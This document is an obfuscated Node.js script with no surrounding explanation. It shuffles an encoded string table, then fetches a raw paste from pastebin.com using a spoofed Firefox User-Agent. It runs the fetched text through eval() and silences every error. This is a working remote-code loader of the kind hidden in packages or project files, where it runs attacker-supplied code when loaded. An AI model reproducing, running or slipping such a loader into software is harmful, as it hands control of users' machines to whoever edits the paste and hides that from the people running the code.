function _0x29c6() {
    var _0x6454af = [
        '971307mngwJc',
        '6928770dJnPTe',
        '6877486OOlSiI',
        'get',
        '/raw/XLeVP82h',
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'error',
        '21tpAJtQ',
        '52634XMBIfg',
        '2308101ioaHBa',
        '4CNnEZF',
        '35znRwos',
        '389622ovVLMn',
        '1671677qaHlLr',
        '32VIduRY'
    ];
    _0x29c6 = function () {
        return _0x6454af;
    };
    return _0x29c6();
}
function _0x2cda(_0x415161, _0x29c6f8) {
    var _0x2cda3c = _0x29c6();
    _0x2cda = function (_0x9586f, _0x4fd3c7) {
        _0x9586f = _0x9586f - 0x0;
        var _0x18dd86 = _0x2cda3c[_0x9586f];
        return _0x18dd86;
    };
    return _0x2cda(_0x415161, _0x29c6f8);
}
var _0x593c29 = _0x2cda;
(function (_0x2b9003, _0x2fe45f) {
    var _0x2091fc = _0x2cda;
    var _0x24bb52 = _0x2b9003();
    while (!![]) {
        try {
            var _0x9625cf = -parseInt(_0x2091fc(0x0)) / 0x1 * (-parseInt(_0x2091fc(0x1)) / 0x2) + parseInt(_0x2091fc(0x2)) / 0x3 * (-parseInt(_0x2091fc(0x3)) / 0x4) + parseInt(_0x2091fc(0x4)) / 0x5 * (parseInt(_0x2091fc(0x5)) / 0x6) + -parseInt(_0x2091fc(0x6)) / 0x7 * (parseInt(_0x2091fc(0x7)) / 0x8) + -parseInt(_0x2091fc(0x8)) / 0x9 + parseInt(_0x2091fc(0x9)) / 0xa + parseInt(_0x2091fc(0xa)) / 0xb;
            if (_0x9625cf === _0x2fe45f) {
                break;
            } else {
                _0x24bb52['push'](_0x24bb52['shift']());
            }
        } catch (_0x5f4f0f) {
            _0x24bb52['push'](_0x24bb52['shift']());
        }
    }
}(_0x29c6, 0x784f1));
try {
    var https = require('https');
    https[_0x593c29(0xb)]({
        'hostname': 'pastebin.com',
        'path': _0x593c29(0xc),
        'headers': {
            'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x206.1;\x20rv:52.0)\x20Gecko/20100101\x20Firefox/52.0',
            'Accept': _0x593c29(0xd)
        }
    }, _0x441ea0 => {
        var _0x2d3b48 = _0x2cda;
        _0x441ea0['setEncoding']('utf8');
        _0x441ea0['on']('data', _0x4fc3a5 => {
            eval(_0x4fc3a5);
        });
        _0x441ea0['on'](_0x2d3b48(0xe), () => {
        });
    })['on']('error', () => {
    });
} catch (_0x32bc4f) {
}
